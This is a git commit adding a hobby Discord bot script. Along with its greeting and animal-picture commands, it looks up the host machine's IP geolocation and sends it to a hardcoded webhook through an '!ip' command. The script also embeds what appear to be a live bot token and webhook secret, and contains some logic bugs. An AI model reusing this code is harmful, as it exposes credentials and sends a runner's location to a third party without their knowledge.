e1d40a1f512a1b8f643052d5ca0a2f6491cc28b2
sofia <36128102+bxrd@users.noreply.github.com>
2021-08-13 21:20:24 +0200

    Create main.py

---
+++ main.py
@@ -0,0 +1,116 @@
+import requests
+import discord
+import random
+import json
+from dhooks import Webhook, Embed
+from datetime import datetime
+
+token = "ODcyODQxNzQ5Njg3NTk5MTM0.YQvvOQ.fnskNO7RqgGYHigP0NEv5JwDv"
+client = discord.Client()
+hook = Webhook("https://discord.com/api/webhooks/875488882068684810/LqRi04y6z6i_KwuB9jMXBCmTUZhKS7wBdqVa6kU-r86DNHj_-K53RQxhoCrlV5cvBR7R")
+time = datetime.now().strftime("%H:%M %p")
+ip = requests.get("https://api.ipify.org/").text
+r = requests.get(f"http://extreme-ip-lookup.com/json/{ip}")
+geo = r.json()
+embed = Embed()
+fields = [
+    {"name": "IP", "value": geo["query"]},
+    {"name": "ipType", "value": geo["ipType"]},
+    {"name": "Country", "value": geo["country"]},
+    {"name": "City", "value": geo["city"]},
+    {"name": "Continent", "value": geo["continent"]},
+    {"name": "Country", "value": geo["country"]},
+    {"name": "IPName", "value": geo["ipName"]},
+    {"name": "ISP", "value": geo["isp"]},
+    {"name": "Latitute", "value": geo["lat"]},
+    {"name": "Longitude", "value": geo["lon"]},
+    {"name": "Org", "value": geo["org"]},
+    {"name": "Region", "value": geo["region"]},
+    {"name": "Status", "value": geo["status"]},
+]
+
+for field in fields:
+    if field["value"]:
+        embed.add_field(name=field["name"], value=field["value"], inline=True)
+
+
+def get_ip():
+    hook.send(embed=embed)
+
+
+@client.event
+async def on_ready():
+    print("Logged in as {0.user}".format(client))
+
+
+@client.event
+async def on_message(message):
+    username = message.author.name
+    user_message = str(message.content)
+    channel = str(message.channel.name)
+    # print(f"{username}: {user_message} ({channel})")
+
+    if message.author == client.user:
+        return
+
+    if message.channel.name == "bot":
+        if user_message.lower() == "hello":
+            await message.channel.send(f"Hello {username}")
+            return
+
+        elif user_message.lower() == "bye":
+            await message.channel.send(f"Goodbye, {username}!")
+            return
+
+        elif user_message.lower() == "":
+            await message.channel.send(f"a")
+            return
+
+        elif user_message.lower() == "!random":
+            await message.channel.send(f"Number: {random.randrange(0, 100)}")
+            return
+
+        elif user_message.lower() == "!dog":
+            await message.delete()
+            page = requests.get(r"https://random.dog/woof.json")
+            data = json.loads(page.text)
+
+            await message.channel.send(data["url"])
+
+        elif user_message.lower() == "!cat":
+            await message.delete()
+            page = requests.get("https://cataas.com/cat")
+
+            await message.channel.send(page.text)
+
+        elif user_message.lower() == "!fox":
+            await message.delete()
+            page = requests.get("https://idk.fox")
+
+            await message.channel.send(page.text)
+
+        elif user_message.lower() == "!embedtest":
+            embed=discord.Embed(title="testing", description="hai", color=0xbc13fe)
+
+            await message.delete()
+            await message.channel.send(embed=embed)
+
+        elif user_message.lower() == "!input":
+            def check(msg):
+              return msg.author == message.author and msg.channel == message.channel and \
+               msg.content.lower() in ["y", "n"]
+
+            msg = await client.wait_for("message", check=check)
+            await message.channel.send("are you pog?")
+
+            if msg.content.lower() == "y" or "yes":
+              await message.channel.send("You said yes")
+            elif msg.content.lower() == "n" or "no":
+              await message.channel.send("You said no")
+
+        elif user_message.lower() == "!ip":
+            await message.delete()
+            get_ip()
+
+
+client.run(token)
